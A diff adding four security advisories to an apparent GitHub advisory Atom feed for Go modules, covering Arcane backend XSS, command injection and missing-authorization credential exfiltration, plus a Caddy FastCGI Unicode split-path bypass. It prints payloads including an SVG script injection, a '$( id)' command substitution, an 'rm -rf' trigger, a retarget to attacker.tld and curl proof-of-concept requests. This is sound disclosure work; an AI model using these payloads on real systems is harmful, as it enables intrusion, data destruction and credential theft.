@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-05-18T13:03:30.455Z</updated>
+    <updated>2026-05-18T15:00:41.743Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,361 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/getarcaneapp/arcane/backend] Arcane Backend: Unauthenticated reflected XSS via SVG color parameter enables admin account takeover]]></title>
+        <id>https://github.com/advisories/GHSA-q2pj-8v84-9mh5</id>
+        <link href="https://github.com/advisories/GHSA-q2pj-8v84-9mh5"/>
+        <updated>2026-05-18T14:19:29.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The unauthenticated <code>GET /api/app-images/logo</code> endpoint reflects a user-supplied <code>color</code> query parameter into the body of an SVG document via <code>strings.ReplaceAll</code> with no escaping. The substitution lands inside a <code>&lt;style&gt;</code> element of the embedded <code>logo.svg</code>, allowing an attacker to close the style block and inject executable <code>&lt;script&gt;</code> content. Because the response is served as <code>image/svg+xml</code> and Arcane sets no Content-Security-Policy or <code>X-Content-Type-Options</code> headers, navigating a logged-in admin victim to a crafted URL executes attacker-controlled JavaScript in Arcane's origin and rides the victim's HttpOnly JWT cookie to fully compromise the admin account.</p>
+<h2 id="details">Details</h2>
+<p>The route is registered in <code>backend/internal/huma/handlers/appimages.go:53-61</code> with an explicitly empty security requirement, marking it as public:</p>
+<pre><code class="language-go">huma.Register(api, huma.Operation{
+    OperationID: "get-logo",
+    Method:      http.MethodGet,
+    Path:        "/app-images/logo",
+    ...
+    Security:    []map[string][]string{}, // explicit: no auth
+}, h.GetLogo)
+</code></pre>
+<p><code>backend/internal/huma/middleware/auth.go:209-213</code> honors the empty <code>Security</code> value by returning <code>reqs.isRequired == false</code> and short-circuiting with <code>next(ctx)</code>, so no JWT/API-key check runs.</p>
+<p><code>GetLogoInput.Color</code> (<code>appimages.go:23</code>) is declared with no validation tags:</p>
+<pre><code class="language-go">type GetLogoInput struct {
+    Full  bool   `query:"full" default:"false" ...`
+    Color string `query:"color" doc:"Optional accent color override ..."`
+}
+</code></pre>
+<p>The handler passes the value straight through <code>getImageWithColor</code> → <code>ApplicationImagesService.GetImageWithColor</code> → <code>applyAccentColorToSVG</code> (<code>backend/internal/services/app_images_service.go:79-105</code>):</p>
+<pre><code class="language-go">svgStr = strings.ReplaceAll(svgStr, "fill:#6D28D9", fmt.Sprintf("fill:%s", accentColor))
+svgStr = strings.ReplaceAll(svgStr, "fill:#6d28d9", fmt.Sprintf("fill:%s", accentColor))
+</code></pre>
+<p>The bundled <code>backend/resources/images/logo.svg</code> contains:</p>
+<pre><code class="language-xml">&lt;style id="style1" type="text/css"&gt;.st0{fill:#6d28d9}&lt;/style&gt;
+</code></pre>
+<p>so a <code>color</code> value like <code>red}&lt;/style&gt;&lt;script&gt;fetch('/api/users',...)&lt;/script&gt;&lt;style&gt;x{</code> produces a valid SVG that closes the <code>&lt;style&gt;</code> element and embeds a <code>&lt;script&gt;</code> element. The response Content-Type is <code>image/svg+xml</code> (from <code>pkg/utils/image/image_util.go</code>), and a grep of the backend confirms no <code>Content-Security-Policy</code>, <code>X-Content-Type-Options</code>, or framing headers are emitted on any route.</p>
+<p>Browsers execute scripts in SVG documents loaded as top-level navigations or via <code>&lt;iframe src=…&gt;</code> / <code>window.open(…)</code>. The execution context is <code>origin(arcane-host)</code>, so the victim's <code>__Host-token</code> / <code>token</code> HttpOnly JWT cookie (recognized by <code>extractTokenFromCookieHeaderInternal</code> at <code>auth.go:274-286</code>) is automatically attached to subsequent same-origin <code>fetch()</code> calls. From there the attacker can invoke any privileged API the victim possesses — most damagingly <code>POST /api/users</code> to create a new admin account, after which the attacker has standalone admin access to manage Docker containers, registries, GitOps secrets, and SSH/registry credentials stored by Arcane.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>Same-origin script execution from an unauthenticated, reachable URL — only user interaction (clicking/visiting the crafted link) is required.</li>
+<li>Full session-riding against any authenticated user, including admins. Because Arcane manages Docker daemons, container exec, image registries, and GitOps repositories, an attacker who lands script execution as an admin victim can:<ul>
+<li>Create persistent attacker-controlled admin accounts via <code>POST /api/users</code>.</li>
+<li>Read/modify secrets stored in environments, registries, and Git repositories the admin can access.</li>
+<li>Start or exec into containers on connected Docker hosts.</li>
+</ul>
+</li>
+<li>HttpOnly cookies do not mitigate the issue — cookies are auto-attached to same-origin <code>fetch()</code>. Absence of CSP and <code>X-Content-Type-Options: nosniff</code> removes available defenses-in-depth.</li>
+</ul>
+<p>Defense-in-depth — add to all responses (and especially to <code>/api/app-images/*</code>):</p>
+<ul>
+<li><code>X-Content-Type-Options: nosniff</code></li>
+<li><code>Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src 'self' data:</code> on the SVG image responses (or the most permissive policy compatible with the frontend on app routes).</li>
+<li>Consider serving these images with <code>Content-Disposition: inline</code> and from a separate cookie-less origin to remove the same-origin session-riding primitive entirely.</li>
+</ul>
+<p>Also enforce the same allowlist on the settings write path (<code>SettingsService</code> → <code>AccentColor</code>) so a stored XSS variant cannot be introduced via the settings API.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/getarcaneapp/arcane/security/advisories/GHSA-q2pj-8v84-9mh5">https://github.com/getarcaneapp/arcane/security/advisories/GHSA-q2pj-8v84-9mh5</a></li>
+<li><a href="https://github.com/advisories/GHSA-q2pj-8v84-9mh5">https://github.com/advisories/GHSA-q2pj-8v84-9mh5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-q2pj-8v84-9mh5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-18T14:19:26.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/getarcaneapp/arcane/backend] Arcane Backend: OS Command Injection in Volume Browser ListDirectory via path query parameter]]></title>
+        <id>https://github.com/advisories/GHSA-9mvm-4gwg-v8mp</id>
+        <link href="https://github.com/advisories/GHSA-9mvm-4gwg-v8mp"/>
+        <updated>2026-05-18T13:59:22.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>GET /environments/{id}/volumes/{volumeName}/browse</code> accepts a <code>path</code> query parameter that is passed to a shell command (<code>sh -c "find … | while …"</code>) inside an Arcane helper container. The path sanitiser blocks <code>../</code> traversal but does not strip Bourne-shell metacharacters such as <code>$()</code> or backticks, and <code>strconv.Quote</code> only escapes Go string metacharacters, not shell substitution sequences. Any authenticated user with access to a browseable volume can execute arbitrary commands inside the helper container; command output is reflected back in the 500 error body.</p>
+<h2 id="details">Details</h2>
+<p>The execution flow is:</p>
+<ol>
+<li><code>BrowseDirectoryInput.Path</code> (query: <code>path</code>) — <code>backend/internal/huma/handlers/volumes.go:148</code></li>
+<li><code>VolumeHandler.BrowseDirectory</code> calls <code>volumeService.ListDirectory(ctx, volumeName, input.Path)</code> — <code>backend/internal/huma/handlers/volumes.go:858-865</code>. Note the route registration at line 412–419 only declares <code>BearerAuth</code>/<code>ApiKeyAuth</code>; there is no <code>checkAdmin(ctx)</code> call (compare with <code>customize.go</code>, <code>system.go</code>, <code>swarm.go</code>, etc., which do enforce admin).</li>
+<li><code>VolumeService.ListDirectory</code> runs the user-supplied path through <code>sanitizeBrowsePathInternal</code>, then joins it under <code>/volume</code>, quotes it with <code>strconv.Quote</code>, and embeds it into a <code>sh -c</code> command:</li>
+</ol>
+<pre><code class="language-go">// backend/internal/services/volume_service.go:286-300
+sanitizedPath, err := s.sanitizeBrowsePathInternal(dirPath)
+...
+targetPath := path.Join("/volume", sanitizedPath)
+quotedPath := strconv.Quote(targetPath)
+cmd := []string{"sh", "-c", fmt.Sprintf(
+    "find %s -mindepth 1 -maxdepth 1 | while IFS= read -r f; do out=$(stat -c \"%%s %%Y %%f %%A\" -- \"$f\" 2&gt;/dev/null) || continue; printf \"%%s\\0%%s\\0\" \"$f\" \"$out\"; done",
+    quotedPath)}
+stdout, _, err := s.execInContainerInternal(ctx, containerID, cmd)
+</code></pre>
+<p>The sanitiser is insufficient (<code>backend/internal/services/volume_service.go:1448-1467</code>):</p>
+<pre><code class="language-go">func (s *VolumeService) sanitizeBrowsePathInternal(input string) (string, error) {
+    trimmed := strings.TrimSpace(input)
+    if trimmed == "" || trimmed == "/" { return "/", nil }
+    cleaned := path.Clean(trimmed)
+    if !path.IsAbs(cleaned) { cleaned = "/" + cleaned }
+    if strings.Contains(cleaned, "/../") || strings.HasSuffix(cleaned, "/..") || cleaned == "/.." {
+        return "", fmt.Errorf("invalid path: path traversal not allowed")
+    }
+    if !strings.HasPrefix(cleaned, "/") { return "", fmt.Errorf("invalid path: must be absolute") }
+    return cleaned, nil
+}
+</code></pre>
+<p>Only <code>../</code> patterns are filtered. <code>$(...)</code>, backticks, <code>;</code>, <code>&amp;</code>, <code>|</code>, <code>&gt;</code>, etc. all pass through unchanged. <code>strconv.Quote</code> then wraps the path in Go-style double quotes, which <code>sh -c</code> interprets as a regular double-quoted string — and bash performs <code>$(...)</code> command substitution inside double quotes.</p>
+<p>For the input <code>/$( id)</code>:</p>
+<ul>
+<li><code>sanitizeBrowsePathInternal</code> returns <code>/$( id)</code> (no <code>../</code> present).</li>
+<li><code>path.Join("/volume", "/$( id)")</code> → <code>/volume/$( id)</code>.</li>
+<li><code>strconv.Quote(...)</code> → <code>"/volume/$( id)"</code>.</li>
+<li>The shell runs <code>find "/volume/$( id)" …</code>, which expands to <code>find "/volume/uid=0(root) gid=0(root) groups=0(root)" …</code>. <code>find</code> fails because that path does not exist; the stderr containing the substituted command output is propagated by <code>execInContainerInternal</code> (volume_service.go:910-918) into a <code>command exited with code N: …</code> error, then re-wrapped by <code>ListDirectory</code> and returned to the client as a 500 response body.</li>
+</ul>
+<p>Errors from the handler at <code>volumes.go:863-864</code> are returned via <code>huma.Error500InternalServerError(err.Error())</code>, so the substituted output is reflected in plaintext.</p>
+<p><strong>Blast radius / mitigations actually present:</strong></p>
+<ul>
+<li>The helper container is created by <code>createTempContainerInternal</code> with <code>NetworkDisabled: true</code>, no privileged mode, no Docker socket mount, only the target Docker volume bind-mounted (<code>:ro</code> for browse). It is auto-removed.</li>
+<li>Therefore the injection executes inside an isolated, network-disabled container that already has read access to the same files the browse API exposes.</li>
+<li>However: the injection grants arbitrary command execution within that container (well beyond the find/stat/readlink/head primitives the API exposes), enables data exfiltration via error-message side channel, and lets an attacker probe the helper image / volume in ways the legitimate API forbids (e.g. read symlink targets the API explicitly censors at <code>volume_service.go:336-356</code>, read past size limits, etc.).</li>
+<li>A non-admin authenticated Arcane user is sufficient (no role check on the volumes browser routes), which makes this a privilege/capability extension for users who otherwise cannot run arbitrary <code>docker exec</code>.</li>
+</ul>
+<p><strong>Secondary issue (same sanitiser):</strong> <code>DeleteFile</code> (<code>volume_service.go:924-963</code>) defends against deleting volume root with <code>if sanitizedPath == "/"</code>. Input <code>path=.</code> yields <code>path.Clean(".") == "."</code> → prefixed to <code>/.</code>, which fails the <code>== "/"</code> check, then <code>path.Join("/volume", "/.") == "/volume"</code>, so the executed command is <code>rm -rf /volume</code>, recursively deleting all volume contents. This is a separate logic flaw worth fixing alongside the sanitiser hardening but is reported here only for completeness.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>Authenticated user (any role, including non-admin) can execute arbitrary shell commands inside the per-volume helper container.</li>
+<li>Output of those commands is reflected in HTTP 500 error bodies — usable as an exfiltration channel.</li>
+<li>Attacker gains capabilities the legitimate API withholds: bypass the symlink-target censoring at <code>volume_service.go:336-356</code>, bypass per-file byte limits, enumerate the helper image, mount-time inspection, etc.</li>
+<li>No host compromise: the container has <code>NetworkDisabled: true</code>, no privileged flag, no Docker socket; the volume is bind-mounted read-only for browse. Confidentiality/integrity/availability impact is therefore limited (CVSS C:L / I:L / A:L) but real.</li>
+<li>The same insufficient sanitiser additionally permits a destructive <code>rm -rf /volume</code> by sending <code>path=.</code> to <code>DELETE /environments/{id}/volumes/{volumeName}/browse</code>, which any authenticated user can also reach.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/getarcaneapp/arcane/security/advisories/GHSA-9mvm-4gwg-v8mp">https://github.com/getarcaneapp/arcane/security/advisories/GHSA-9mvm-4gwg-v8mp</a></li>
+<li><a href="https://github.com/advisories/GHSA-9mvm-4gwg-v8mp">https://github.com/advisories/GHSA-9mvm-4gwg-v8mp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9mvm-4gwg-v8mp</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-18T13:59:22.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/getarcaneapp/arcane/backend] Arcane Backend: Missing admin authorization on git repository endpoints allows non-admin users to exfiltrate stored Git credentials and tamper with GitOps configs]]></title>
+        <id>https://github.com/advisories/GHSA-7h26-hg47-p9hx</id>
+        <link href="https://github.com/advisories/GHSA-7h26-hg47-p9hx"/>
+        <updated>2026-05-18T13:44:50.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Arcane's huma-based REST API exposes nine endpoints under <code>/api/customize/git-repositories</code> and <code>/api/git-repositories/sync</code> for managing GitOps source repositories and their stored credentials. Eight of those endpoints (<code>list</code>, <code>create</code>, <code>get</code>, <code>update</code>, <code>delete</code>, <code>test</code>, <code>listBranches</code>, <code>browseFiles</code>) never call the <code>checkAdmin(ctx)</code> helper that every other admin-managed resource (container registries, environments, users, API keys, swarm, settings, system, notifications, events) uses, and the huma authentication middleware deliberately enforces only authentication, not the <code>admin</code> role. As a result, any logged-in user with the default <code>user</code> role can list, create, modify, delete, and test git repository configurations. By repointing an existing repository's URL to an attacker-controlled host while omitting the <code>token</code>/<code>sshKey</code> fields (which <code>UpdateRepository</code> only rewrites when explicitly supplied), the attacker causes Arcane to decrypt the legitimate PAT/SSH key on its next <code>/test</code>, <code>/branches</code>, or <code>/files</code> call and present it as HTTP Basic auth (or SSH key auth) to the attacker's host — producing a one-step exfiltration of plaintext Git credentials.</p>
+<h2 id="details">Details</h2>
+<h3 id="auth-bridge-does-not-enforce-role">Auth bridge does not enforce role</h3>
+<p><code>backend/internal/huma/middleware/auth.go:192-254</code> (<code>NewAuthBridge</code>) validates Bearer JWTs / API keys / agent tokens and stores the user (and an <code>userIsAdmin</code> flag) in the request context, but it never rejects non-admin callers — admin enforcement is intentionally delegated to handlers via <code>helpers.checkAdmin</code>:</p>
+<pre><code class="language-go">// backend/internal/huma/handlers/helpers.go:11-12
+// checkAdmin checks if the current user is an admin and returns a 403 error if not.
+func checkAdmin(ctx context.Context) error { ... }
+</code></pre>
+<p><code>grep -rn "checkAdmin"</code> confirms every other admin resource uses it (container_registries, environments, users, apikeys, events, settings, swarm, system, notifications). Default new accounts get role <code>"user"</code> (<code>backend/internal/huma/handlers/users.go:222-223</code>):</p>
+<pre><code class="language-go">if userModel.Roles == nil {
+    userModel.Roles = []string{"user"}
+}
+</code></pre>
+<h3 id="git-repository-handler-is-missing-the-admin-gate-on-8-of-9-endpoints">Git repository handler is missing the admin gate on 8 of 9 endpoints</h3>
+<p><code>backend/internal/huma/handlers/git_repositories.go:117-236</code> registers nine endpoints. Only <code>SyncRepositories</code> (line 456) calls <code>checkAdmin(ctx)</code>. The other handlers — <code>ListRepositories</code> (line 243), <code>CreateRepository</code> (271), <code>GetRepository</code> (301), <code>UpdateRepository</code> (326), <code>DeleteRepository</code> (356), <code>TestRepository</code> (382), <code>ListBranches</code> (407), <code>BrowseFiles</code> (428) — perform no role check whatsoever:</p>
+<pre><code class="language-go">// backend/internal/huma/handlers/git_repositories.go:326-336
+func (h *GitRepositoryHandler) UpdateRepository(ctx context.Context, input *UpdateGitRepositoryInput) (*UpdateGitRepositoryOutput, error) {
+    if h.repoService == nil {
+        return nil, huma.Error500InternalServerError("service not available")
+    }
+    actor := models.User{}
+    if currentUser, exists := humamw.GetCurrentUserFromContext(ctx); exists &amp;&amp; currentUser != nil {
+        actor = *currentUser
+    }
+    repo, err := h.repoService.UpdateRepository(ctx, input.ID, input.Body, actor)
+    ...
+</code></pre>
+<p>The service layer (<code>backend/internal/services/git_repository_service.go</code>) has no role enforcement either — <code>grep -n "admin" backend/internal/services/git_repository_service.go</code> returns nothing.</p>
+<h3 id="credential-preserving-update-primitive">Credential-preserving update primitive</h3>
+<p><code>UpdateRepository</code> builds a partial update map: the <code>token</code>/<code>ssh_key</code> columns are only rewritten if the corresponding pointer in the request body is non-nil, while the URL is updated unconditionally when <code>req.URL != nil</code>:</p>
+<pre><code class="language-go">// backend/internal/services/git_repository_service.go:185-219
+updates := make(map[string]any)
+if req.Name != nil      { updates["name"] = *req.Name }
+if req.URL != nil       { updates["url"]  = *req.URL }   // &lt;-- attacker-pivotable
+if req.AuthType != nil  { updates["auth_type"] = *req.AuthType }
+...
+if req.Token != nil {                                      // &lt;-- only rewritten if supplied
+    if *req.Token == "" { updates["token"] = "" } else {
+        encrypted, err := crypto.Encrypt(*req.Token)
+        ...
+        updates["token"] = encrypted
+    }
+}
+</code></pre>
+<p>So <code>PUT /customize/git-repositories/{id}</code> with body <code>{"url":"https://attacker.tld/repo.git"}</code> retargets the repository while preserving the encrypted token.</p>
+<h3 id="sink-basic-auth-send-to-attacker-url">Sink: Basic-auth send to attacker URL</h3>
+<p><code>TestConnection</code> and <code>ListBranches</code>/<code>BrowseFiles</code> decrypt the stored token via <code>GetAuthConfig</code> and pass the chosen URL + auth to <code>gitutil</code>:</p>
+<pre><code class="language-go">// backend/internal/services/git_repository_service.go:340-363
+func (s *GitRepositoryService) GetAuthConfig(ctx context.Context, repository *models.GitRepository) (git.AuthConfig, error) {
+    authConfig := git.AuthConfig{
+        AuthType: repository.AuthType, Username: repository.Username, ...
+    }
+    if repository.Token != "" {
+        token, err := crypto.Decrypt(repository.Token)
+        ...
+        authConfig.Token = token
+    }
+    ...
+}
+</code></pre>
+<pre><code class="language-go">// backend/pkg/gitutil/git.go:60-69
+case "http":
+    if config.Token != "" {
+        return &amp;githttp.BasicAuth{
+            Username: config.Username,
+            Password: config.Token,
+        }, nil
+    }
+</code></pre>
+<p><code>go-git</code>'s HTTP transport sends <code>Authorization: Basic base64(username:token)</code> in the very first reference-discovery request to the (attacker-controlled) URL — so the cleartext PAT lands in the attacker's web-server access log on the first call to <code>/test</code>, <code>/branches</code>, or <code>/files</code>.</p>
+<h3 id="full-attack-chain-http-token-variant">Full attack chain (HTTP-token variant)</h3>
+<ol>
+<li>Attacker authenticates as a normal <code>user</code> (registration or any pre-existing low-priv account).</li>
+<li><code>GET /api/customize/git-repositories</code> enumerates all configured repositories (id, url, authType, username — token/sshKey are encrypted but their <em>existence</em> is visible).</li>
+<li><code>PUT /api/customize/git-repositories/{id}</code> with <code>{"url":"https://attacker.tld/repo.git"}</code> retargets the repo while preserving the encrypted PAT.</li>
+<li><code>POST /api/customize/git-repositories/{id}/test</code> (or <code>GET .../branches</code>) makes Arcane decrypt the PAT and send it to <code>attacker.tld</code> as HTTP Basic auth.</li>
+<li>Optional cleanup: <code>PUT</code> again to restore the original URL, leaving no obvious config drift; or <code>DELETE</code> every repo for DoS on the GitOps pipeline.</li>
+</ol>
+<p>The same primitive works for <code>authType: "ssh"</code> repos by retargeting to an attacker-controlled SSH endpoint that logs the offered key (or, with the default <code>accept_new</code> host-key mode, by the attacker simply observing the SSH session).</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Cleartext exfiltration of stored Git credentials.</strong> PATs and SSH keys configured by administrators for source-of-truth GitOps repositories are encrypted at rest with a key Arcane controls, but any authenticated low-priv user can cause the application to decrypt them and transmit them to an attacker-chosen URL. Stolen GitHub/GitLab PATs typically grant write access to the org's source repos, CI secrets, container registries, and downstream production systems — escaping Arcane's security boundary entirely (S:C).</li>
+<li><strong>Privilege escalation to effective Arcane admin over GitOps.</strong> Non-admin users can create, modify, and delete every git repository configuration, controlling what code Arcane pulls and deploys.</li>
+<li><strong>Supply-chain integrity loss.</strong> A user can swap the URL of an enabled repo to a malicious fork, then revert it after a sync, to inject attacker-controlled images/manifests into deployments.</li>
+<li><strong>Denial of service on the GitOps pipeline.</strong> <code>DELETE /customize/git-repositories/{id}</code> lets any user wipe production repository configurations.</li>
+<li><strong>Information disclosure of private repo contents.</strong> <code>GET .../files</code> clones private repos using stored credentials and returns file contents in the API response, regardless of caller role.</li>
+</ul>
+<p>Default Arcane installations create new accounts with role <code>user</code>; no special configuration is required for the attack to be reachable.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/getarcaneapp/arcane/security/advisories/GHSA-7h26-hg47-p9hx">https://github.com/getarcaneapp/arcane/security/advisories/GHSA-7h26-hg47-p9hx</a></li>
+<li><a href="https://github.com/advisories/GHSA-7h26-hg47-p9hx">https://github.com/advisories/GHSA-7h26-hg47-p9hx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-7h26-hg47-p9hx</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-05-18T13:44:47.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/caddyserver/caddy/v2] Caddy: Unsafe Unicode Handling in FastCGI splitPos Allows Execution of Non-PHP Files]]></title>
+        <id>https://github.com/advisories/GHSA-m675-2p33-xv9g</id>
+        <link href="https://github.com/advisories/GHSA-m675-2p33-xv9g"/>
+        <updated>2026-05-18T13:41:00.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The FastCGI transport's <code>splitPos()</code> in <a href="https://github.com/caddyserver/caddy/blob/master/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go"><code>modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go</code></a> misuses <code>golang.org/x/text/search</code> with <code>search.IgnoreCase</code> when the request path contains a non-ASCII byte. Two distinct flaws in that fallback let an attacker mislead Caddy's FastCGI splitting into treating a non-<code>.php</code> (or other configured <code>split_path</code> extension) file as a script. In any deployment where the attacker can place content into a file served via FastCGI (uploads, file storage, etc.), this can be escalated to remote code execution by crafting a URL whose path triggers either flaw.</p>
+<p>This function was adapted from FrankenPHP's code (see <a href="https://github.com/caddyserver/caddy/blob/master/modules/caddyhttp/reverseproxy/fastcgi/fastcgi.go#L429">the source comment</a>) and inherits the same bugs. Both were originally reported against FrankenPHP by @KC1zs4 as <a href="https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm">GHSA-3g8v-8r37-cgjm</a> (which absorbed the duplicate GHSA-v4h7-cj44-8fc8). Credit for finding the underlying flaws belongs to @KC1zs4.</p>
+<h3 id="details">Details</h3>
+<pre><code class="language-go">var splitSearchNonASCII = search.New(language.Und, search.IgnoreCase)
+
+func (t Transport) splitPos(path string) int {
+    if len(t.SplitPath) == 0 {
+        return 0
+    }
+    pathLen := len(path)
+    for _, split := range t.SplitPath {
+        splitLen := len(split)
+        for i := range pathLen {
+            if path[i] &gt;= utf8.RuneSelf {
+                if _, end := splitSearchNonASCII.IndexString(path, split); end &gt; -1 {
+                    return end
+                }
+                break
+            }
+            if i+splitLen &gt; pathLen {
+                continue
+            }
+            match := true
+            for j := range splitLen {
+                c := path[i+j]
+                if c &gt;= utf8.RuneSelf {
+                    if _, end := splitSearchNonASCII.IndexString(path, split); end &gt; -1 {
+                        return end
+                    }
+                    break // &lt;-- flaw 1: 'match' is still true
+                }
+                if 'A' &lt;= c &amp;&amp; c &lt;= 'Z' {
+                    c += 'a' - 'A'
+                }
+                if c != split[j] {
+                    match = false
+                    break
+                }
+            }
+            if match {
+                return i + splitLen
+            }
+        }
+    }
+    return -1
+}
+</code></pre>
+<h4 id="flaw-1--control-flow-stale-match-after-inner-non-ascii-fallback">Flaw 1 — Control-flow: stale <code>match</code> after inner non-ASCII fallback</h4>
+<p>In the inner <code>for j</code> loop, when a byte satisfies <code>c &gt;= utf8.RuneSelf</code> and <code>splitSearchNonASCII.IndexString(...)</code> returns <code>-1</code>, the loop <code>break</code>s without setting <code>match = false</code>. The outer code then evaluates <code>if match { return i + splitLen }</code> with <code>match</code> still <code>true</code>, returning a position as if the configured extension had been matched. The script-name suffix actually present at that offset is whatever bytes the attacker chose, so a file named <code>name.&lt;U+00A1&gt;.txt</code> gets routed as PHP.</p>
+<h4 id="flaw-2--unicode-equivalence-searchignorecase-folds-non-ascii-lookalikes-onto-ascii">Flaw 2 — Unicode equivalence: <code>search.IgnoreCase</code> folds non-ASCII lookalikes onto ASCII</h4>
+<p><code>search.New(language.Und, search.IgnoreCase)</code> performs Unicode equivalence matching (compatibility decomposition + case folding), which goes far beyond the ASCII-only case folding the surrounding code is built for. Many code points fold onto ASCII <code>.</code>, <code>p</code>, <code>h</code>, <code>p</code>, so a path containing <code>﹒php</code>, <code>．php</code>, <code>.ｐhp</code>, <code>.ⓟⓗⓟ</code>, <code>.𝗽𝗵𝗽</code>, <code>.𝓅𝒽𝓅</code>, <code>.𝖕𝖍𝖕</code>, etc. is reported as <code>.php</code>.</p>
+<p>Both flaws share the same root cause: invoking <code>search.IgnoreCase</code> to match an ASCII-only, validated-lower-case <code>SplitPath</code> entry against an arbitrary path. <code>Provision()</code> already guarantees every entry is ASCII and lower-cased, so any byte <code>&gt;= utf8.RuneSelf</code> in the path can never be part of a legitimate match — but the fallback ignored that guarantee.</p>
+<h3 id="poc">PoC</h3>
+<p>Run against a Caddy build serving FastCGI to PHP-FPM (or any FastCGI app where script lookup is gated by <code>split_path</code>). Caddyfile:</p>
+<pre><code class="language-text">:8080 {
+    root * /app/public
+    php_fastcgi unix//run/php/php-fpm.sock
+}
+</code></pre>
+<p>Place attacker-controlled files in <code>/app/public</code>:</p>
+<ul>
+<li><code>/app/public/poc-match-unset.\xc2\xa1.</code> — <code>&lt;?php echo "marker=flaw1\n";</code></li>
+<li><code>/app/public/poc-search-norm.𝗽𝗵𝗽</code> — <code>&lt;?php echo "marker=flaw2\n";</code></li>
+</ul>
+<p>Trigger:</p>
+<pre><code class="language-bash"># baseline (correctly NOT routed to PHP)
+curl -i --path-as-is "http://127.0.0.1:8080/poc-match-unset.txt/trigger"
+curl -i --path-as-is "http://127.0.0.1:8080/poc-search-norm/trigger"
+
+# flaw 1 — the .¡.txt file ends up as SCRIPT_FILENAME
+curl -i --path-as-is "http://127.0.0.1:8080/poc-match-unset.%C2%A1.txt/trigger"
+
+# flaw 2 — the .𝗽𝗵𝗽 file ends up as SCRIPT_FILENAME
+curl -i --path-as-is "http://127.0.0.1:8080/poc-search-norm.%F0%9D%97%BD%F0%9D%97%B5%F0%9D%97%BD.anything-after-payload.php/trigger"
+</code></pre>
+<p>Both crafted requests respond with the marker payload from the non-<code>.php</code> file, confirming arbitrary code execution through the body of attacker-controlled files.</p>
+<p>A standalone reproducer of <code>splitPos()</code> in isolation (no Caddy build needed) is included in <a href="https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm">GHSA-3g8v-8r37-cgjm</a>; the function in this module is the same logic, so the same payloads apply.</p>
+<h3 id="impact">Impact</h3>
+<p>Comparable to the previous FastCGI <code>split_path</code> issue (<a href="https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38">GHSA-g966-83w7-6w38 / CVE-2026-24895</a>) but with a stricter precondition: the attacker needs the ability to place content into a file whose name matches one of the bypass patterns (the Unicode lookalike forms or a name containing a non-ASCII byte after a <code>.</code>). Where that precondition holds — common in upload endpoints, user-content stores, package mirrors — the bypass yields RCE in the FastCGI upstream via a single crafted URL, without authentication, over the network.</p>
+<p>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H — High (8.1).</p>
+<h3 id="patch">Patch</h3>
+<p>Drop the <code>golang.org/x/text/search</code> fallback entirely and treat any byte <code>&gt;= utf8.RuneSelf</code> in the path as a non-match. <code>SplitPath</code> entries are validated ASCII-only and lower-cased upstream, so this preserves correct behavior for every legitimate path while making the Unicode bypasses unrepresentable. The replacement is a tight byte loop with no library calls in the hot path. See <code>fix/fastcgi-splitpos-unicode-bypass</code> (commit <code>4ddad83c</code>) for the implementation and regression tests.</p>
+<h3 id="credit">Credit</h3>
+<p>Both flaws were originally found and reported by @KC1zs4 against FrankenPHP, where the offending <code>splitPos()</code> function was first introduced before being adapted into this module. The Caddy maintainers thank @KC1zs4 for the high-quality reports.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/caddyserver/caddy/security/advisories/GHSA-m675-2p33-xv9g">https://github.com/caddyserver/caddy/security/advisories/GHSA-m675-2p33-xv9g</a></li>
+<li><a href="https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm">https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm</a></li>
+<li><a href="https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38">https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38</a></li>
+<li><a href="https://github.com/advisories/GHSA-m675-2p33-xv9g">https://github.com/advisories/GHSA-m675-2p33-xv9g</a></li>
+</ul>
+]]></content>
+        <author>
